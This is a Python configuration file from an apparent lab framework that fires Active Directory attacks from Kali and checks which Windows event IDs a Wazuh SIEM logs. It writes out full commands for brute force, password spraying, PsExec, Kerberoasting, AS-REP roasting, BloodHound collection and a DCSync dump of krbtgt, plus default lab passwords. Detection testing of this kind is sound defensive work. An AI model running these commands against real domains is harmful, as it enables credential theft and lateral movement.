"""
config.py

Central configuration for AD SIEM Framework.

Loads lab settings from a local .env file when present, then builds the
UI-compatible ATTACK_CONFIG used by ui_app.py.
"""

import os
from pathlib import Path


# ==============================
# .ENV LOADER
# ==============================

def load_env_file(file_name=".env"):
    env_path = Path(__file__).resolve().parent / file_name

    if not env_path.exists():
        return

    with open(env_path, "r", encoding="utf-8") as file:
        for line in file:
            line = line.strip()

            if not line or line.startswith("#") or "=" not in line:
                continue

            key, value = line.split("=", 1)
            key = key.strip()
            value = value.strip().strip('"').strip("'")

            if key and key not in os.environ:
                os.environ[key] = value


def env_value(key, default):
    return os.getenv(key, default)


def env_int(key, default):
    try:
        return int(os.getenv(key, str(default)))
    except ValueError:
        return default


load_env_file()


# ==============================
# LAB ENVIRONMENT
# ==============================

LAB_CONFIG = {
    "DC01": {
        "ip": env_value("LAB_DC01_IP", "192.168.56.10"),
        "hostname": env_value("LAB_DC01_HOSTNAME", "DC01"),
        "fqdn": env_value("LAB_DC01_FQDN", "DC01.corp.local"),
    },
    "WIN10": {
        "ip": env_value("LAB_WIN10_IP", "192.168.56.20"),
        "hostname": env_value("LAB_WIN10_HOSTNAME", "WIN10-CLIENT"),
    },
    "KALI": {
        "ip": env_value("LAB_KALI_IP", "192.168.56.30"),
        "username": env_value("LAB_KALI_USER", "kali"),
        "password": env_value("LAB_KALI_PASSWORD", "1234"),
    },
    "WAZUH_API": {
        "host": env_value("WAZUH_HOST", "192.168.56.50"),
        "port": env_int("WAZUH_PORT", 55000),
        "username": env_value("WAZUH_API_USER", "wazuh-wui"),
        "password": env_value("WAZUH_API_PASSWORD", ""),
    },
}

WAZUH_API = LAB_CONFIG["WAZUH_API"]


# ==============================
# ATTACK SUPPORT SETTINGS
# ==============================

DOMAIN_CONFIG = {
    "domain": env_value("AD_DOMAIN", "corp.local"),
    "netbios": env_value("AD_NETBIOS", "CORP"),
    "admin_user": env_value("AD_ADMIN_USER", "administrator"),
    "admin_password": env_value("AD_ADMIN_PASSWORD", "Password123"),
}

KALI_PATHS = {
    "users": env_value("KALI_USERS_FILE", "/home/kali/Desktop/attack_lists/users.txt"),
    "passwords": env_value("KALI_PASSWORDS_FILE", "/home/kali/Desktop/attack_lists/passwords.txt"),
    "bloodhound_output": env_value("KALI_BLOODHOUND_OUTPUT", "/home/kali/Desktop/bloodhound"),
}


# ==============================
# COMMAND HELPERS
# ==============================

def service_precheck(port, service_name, command):
    return (
        "bash -lc '"
        f"if nc -z -w 5 {{target}} {port}; then "
        f"{command}; "
        "else "
        f"echo \"[PRECHECK_FAILED] {service_name} port {port} is not reachable on {{target}}\"; "
        "exit 2; "
        "fi'"
    )


# ==============================
# ATTACK CONFIG
# ==============================

ATTACK_CONFIG = {
    "smb_bruteforce": {
        "name": "SMB Brute Force",
        "tool": "CrackMapExec",
        "category": "Credential Attack",
        "description": "Attempts SMB authentication using username and password lists.",
        "command": service_precheck(
            445,
            "SMB",
            (
                f"crackmapexec smb {{target}} "
                f"-u {KALI_PATHS['users']} "
                f"-p {KALI_PATHS['passwords']} "
                "--continue-on-success"
            ),
        ),
        "expected_event_ids": [4625],
        "timeout": 180,
    },
    "rdp_bruteforce": {
        "name": "RDP Brute Force",
        "tool": "Hydra",
        "category": "Credential Attack",
        "description": "Attempts RDP authentication against the selected target.",
        "command": service_precheck(
            3389,
            "RDP",
            (
                f"hydra -t 4 -V -f "
                f"-l {DOMAIN_CONFIG['admin_user']} "
                f"-P {KALI_PATHS['passwords']} "
                "rdp://{target}"
            ),
        ),
        "expected_event_ids": [4624, 4625],
        "timeout": 180,
    },
    "psexec": {
        "name": "PsExec Remote Execution",
        "tool": "Impacket PsExec",
        "category": "Lateral Movement",
        "description": "Executes a remote service-style command through SMB.",
        "command": service_precheck(
            445,
            "SMB",
            (
                f"impacket-psexec "
                f"{DOMAIN_CONFIG['domain']}/{DOMAIN_CONFIG['admin_user']}:"
                f"{DOMAIN_CONFIG['admin_password']}@{{target}}"
            ),
        ),
        "expected_event_ids": [4624, 4688, 7045],
        "timeout": 240,
    },
    "smb_share_enum": {
        "name": "SMB Share Enumeration",
        "tool": "CrackMapExec",
        "category": "Discovery",
        "description": "Enumerates SMB shares using valid domain credentials.",
        "command": service_precheck(
            445,
            "SMB",
            (
                f"crackmapexec smb {{target}} "
                f"-u {DOMAIN_CONFIG['admin_user']} "
                f"-p {DOMAIN_CONFIG['admin_password']} "
                "--shares"
            ),
        ),
        "expected_event_ids": [4624],
        "timeout": 120,
    },
    "smb_password_spray": {
        "name": "SMB Password Spray",
        "tool": "CrackMapExec",
        "category": "Credential Attack",
        "description": "Sprays one password across multiple users over SMB.",
        "command": service_precheck(
            445,
            "SMB",
            (
                f"crackmapexec smb {{target}} "
                f"-u {KALI_PATHS['users']} "
                f"-p {DOMAIN_CONFIG['admin_password']} "
                "--continue-on-success"
            ),
        ),
        "expected_event_ids": [4624, 4625],
        "timeout": 180,
    },
    "winrm_bruteforce": {
        "name": "WinRM Brute Force",
        "tool": "CrackMapExec",
        "category": "Credential Attack",
        "description": "Attempts WinRM authentication using username and password lists.",
        "command": service_precheck(
            5985,
            "WinRM",
            (
                f"crackmapexec winrm {{target}} "
                f"-u {KALI_PATHS['users']} "
                f"-p {KALI_PATHS['passwords']} "
                "--continue-on-success"
            ),
        ),
        "expected_event_ids": [4624, 4625],
        "timeout": 180,
    },
    "evil_winrm_login": {
        "name": "WinRM Remote Command",
        "tool": "CrackMapExec WinRM",
        "category": "Remote Access",
        "description": "Runs a non-interactive command over WinRM for clean UI/report output.",
        "command": service_precheck(
            5985,
            "WinRM",
            (
                f"crackmapexec winrm {{target}} "
                f"-u {DOMAIN_CONFIG['admin_user']} "
                f"-p {DOMAIN_CONFIG['admin_password']} "
                "-x whoami"
            ),
        ),
        "expected_event_ids": [4624, 4688],
        "timeout": 120,
    },
    "kerberos_user_enum": {
        "name": "Kerberos User Enumeration",
        "tool": "Kerbrute",
        "category": "Discovery",
        "description": "Enumerates valid AD usernames through Kerberos responses.",
        "command": service_precheck(
            88,
            "Kerberos",
            (
                f"kerbrute userenum "
                f"--dc {{target}} "
                f"-d {DOMAIN_CONFIG['domain']} "
                f"{KALI_PATHS['users']}"
            ),
        ),
        "expected_event_ids": [4768],
        "timeout": 180,
    },
    "asrep_roasting": {
        "name": "AS-REP Roasting",
        "tool": "Impacket GetNPUsers",
        "category": "Credential Attack",
        "description": "Requests AS-REP material for users without pre-authentication.",
        "command": service_precheck(
            88,
            "Kerberos",
            (
                f"impacket-GetNPUsers {DOMAIN_CONFIG['domain']}/ "
                f"-usersfile {KALI_PATHS['users']} "
                "-no-pass "
                "-dc-ip {target}"
            ),
        ),
        "expected_event_ids": [4768],
        "timeout": 180,
    },
    "kerberoasting": {
        "name": "Kerberoasting",
        "tool": "Impacket GetUserSPNs",
        "category": "Credential Attack",
        "description": "Requests service tickets for SPN-enabled accounts.",
        "command": service_precheck(
            88,
            "Kerberos",
            (
                f"impacket-GetUserSPNs "
                f"{DOMAIN_CONFIG['domain']}/{DOMAIN_CONFIG['admin_user']}:"
                f"{DOMAIN_CONFIG['admin_password']} "
                "-dc-ip {target} "
                "-request"
            ),
        ),
        "expected_event_ids": [4769],
        "timeout": 180,
    },
    "ldap_rootdse_enum": {
        "name": "LDAP RootDSE Enumeration",
        "tool": "ldapsearch",
        "category": "Discovery",
        "description": "Queries LDAP RootDSE naming contexts from the domain controller.",
        "command": service_precheck(
            389,
            "LDAP",
            "ldapsearch -x -H ldap://{target} -s base namingcontexts",
        ),
        "expected_event_ids": [4624],
        "timeout": 90,
    },
    "bloodhound_collection": {
    "name": "BloodHound Collection",
    "tool": "bloodhound-python",
    "category": "Discovery",
    "description": "Collects AD relationship data for BloodHound analysis.",
    "command": service_precheck(
        389,
        "LDAP",
        (
            f"cd /home/kali/Desktop/bloodhound && "
            f"bloodhound-python "
            f"-u {DOMAIN_CONFIG['admin_user']} "
            f"-p {DOMAIN_CONFIG['admin_password']} "
            f"-d {DOMAIN_CONFIG['domain']} "
            f"-dc {LAB_CONFIG['DC01']['fqdn']} "
            f"-ns {LAB_CONFIG['DC01']['ip']} "
            "-c All "
            "--zip "
            "--dns-tcp "
        ),
    ),
    "expected_event_ids": [4624, 4662],
    "timeout": 300,
},
    "dcsync_attempt": {
        "name": "DCSync Attempt",
        "tool": "Impacket secretsdump",
        "category": "Credential Access",
        "description": "Attempts domain replication-style credential extraction.",
        "command": service_precheck(
            445,
            "SMB",
            (
                f"impacket-secretsdump "
                f"{DOMAIN_CONFIG['domain']}/{DOMAIN_CONFIG['admin_user']}:"
                f"{DOMAIN_CONFIG['admin_password']}@{{target}} "
                "-just-dc-user krbtgt"
            ),
        ),
        "expected_event_ids": [4624, 4662],
        "timeout": 240,
    },
}


# ==============================
# FRAMEWORK SETTINGS
# ==============================

FRAMEWORK_CONFIG = {
    "log_wait_time": env_int("LOG_WAIT_TIME", 15),
    "max_alerts_fetch": env_int("MAX_ALERTS_FETCH", 300),
    "time_window_minutes": env_int("TIME_WINDOW_MINUTES", 10),
}


# ==============================
# PATHS
# ==============================

PATHS = {
    "logs_dir": env_value("LOGS_DIR", "logs"),
    "reports_dir": env_value("REPORTS_DIR", "reports"),
}


# ==============================
# REPORT CONFIG
# ==============================

REPORT_CONFIG = {
    "title": env_value("REPORT_TITLE", "Cybersecurity Framework Report"),
    "author": env_value("REPORT_AUTHOR", "Pranav Amin - AD SIEM Framework"),
}
